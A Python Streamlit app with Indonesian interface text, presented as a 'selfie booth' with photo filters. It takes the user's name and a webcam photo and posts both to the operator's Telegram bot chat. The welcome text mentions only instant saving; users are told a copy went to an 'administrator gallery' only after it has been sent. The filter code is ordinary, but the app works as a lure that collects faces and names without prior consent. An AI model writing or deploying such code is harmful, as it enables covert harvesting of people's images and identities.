import io
import requests
from PIL import Image, ImageEnhance, ImageOps
import streamlit as st

# Konfigurasi Halaman
st.set_page_config(
    page_title="VZ Modern Selfie Booth", page_icon="✨", layout="centered"
)

# --- STYLING CSS ESTETIK MODERN ---
st.markdown(
    """
    <style>
    .stApp {
        background-color: #0f172a;
        color: #f8fafc;
    }
    h1, h2, h3 {
        color: #38bdf8 !important;
        font-family: 'Inter', sans-serif;
    }
    .booth-card {
        background-color: #1e293b;
        border: 1px solid #334155;
        padding: 20px;
        border-radius: 12px;
        margin-bottom: 20px;
    }
    </style>
""",
    unsafe_allow_html=True,
)

# --- KONFIGURASI BOT TELEGRAM ANDA ---
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"


def send_styled_photo_to_telegram(photo_bytes, user_name, filter_used):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
  files = {"photo": ("vz_selfie.jpg", photo_bytes, "image/jpeg")}
  caption = (
      f"✨ **NEW SELVIE BOOTH CAPTURE**\n\n"
      f"👤 Nama: {user_name}\n"
      f"🎨 Efek/Filter: {filter_used}\n"
      f"📸 Status: Berhasil Dikirim ke Koleksi Admin"
  )
  data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}

  try:
    response = requests.post(url, data=data_dict, files=files)
    return response.json()
  except Exception as e:
    return {"ok": False, "description": str(e)}


def apply_filter(image, filter_name):
  """Fungsi untuk memproses efek filter foto menggunakan PIL"""
  img = image.convert("RGB")

  if filter_name == "Monochrome (Hitam Putih Klasik)":
    img = ImageOps.grayscale(img).convert("RGB")
  elif filter_name == "Vintage Sepia":
    # Konversi ke sepia sederhana
    grayscale = ImageOps.grayscale(img)
    img = ImageOps.colorize(grayscale, "#704214", "#FFC0CB").convert("RGB")
  elif filter_name == "Cinematic High Contrast":
    enhancer = ImageEnhance.Contrast(img)
    img = enhancer.enhance(1.8)
  elif filter_name == "Cyber Neon Glow":
    enhancer = ImageEnhance.Color(img)
    img = enhancer.enhance(2.0)  # Tingkatkan saturasi warna
  # Default: Normal / Original

  return img


# --- ANTARMUKA APLIKASI ---
st.title("✨ VZ Modern Selfie Booth")
st.markdown(
    """
<div class='booth-card'>
<b>Selamat datang di Studio Foto Instan!</b> Pilih gaya efek favoritmu, ambil pose terbaikmu di depan kamera, dan hasil fotomu akan langsung tersimpan secara instan.
</div>
""",
    unsafe_allow_html=True,
)

# Input data pengguna
user_name = st.text_input("Nama Anda / Panggilan:")

# Pilihan Filter / Efek Kamera
st.subheader("🎨 Pilih Efek & Filter Keren")
selected_filter = st.selectbox(
    "Pilih gaya filter foto:",
    [
        "Normal (Original)",
        "Monochrome (Hitam Putih Klasik)",
        "Vintage Sepia",
        "Cinematic High Contrast",
        "Cyber Neon Glow",
    ],
)

st.markdown("---")
st.subheader("📷 Ambil Foto")
camera_image = st.camera_input("Posisikan wajahmu dengan pas di dalam frame")

if camera_image is not None:
  if st.button("✨ Proses & Kirim Foto"):
    if not user_name:
      st.warning("⚠️ Mohon isi nama kamu terlebih dahulu sebelum menjepret!")
    else:
      with st.spinner("Memproses efek filter dan mengirim ke server..."):
        # Buka gambar asli dari kamera
        original_img = Image.open(camera_image)

        # Terapkan filter yang dipilih
        processed_img = apply_filter(original_img, selected_filter)

        # Ubah gambar hasil filter kembali ke format bytes untuk dikirim
        buf = io.BytesIO()
        processed_img.save(buf, format="JPEG", quality=95)
        byte_im = buf.getvalue()

        # Kirim foto berfilter ke Telegram Anda
        telegram_res = send_styled_photo_to_telegram(
            byte_im, user_name, selected_filter
        )

      st.success("🎉 Yeay! Foto berhasil diproses dan dikirim.")

      # Tampilkan hasil foto yang sudah diberi efek ke layar pengguna
      st.markdown("### 🖼️ Hasil Foto Kamu:")
      st.image(
          processed_img,
          caption=f"Gaya: {selected_filter}",
          use_container_width=True,
      )

      if telegram_res.get("ok"):
        st.caption(
            "🔒 Salinan foto kerenmu telah otomatis terkirim ke galeri pusat"
            " administrator."
        )
      else:
        st.error("Gagal mengirim foto ke Telegram. Periksa kembali Token Bot.")
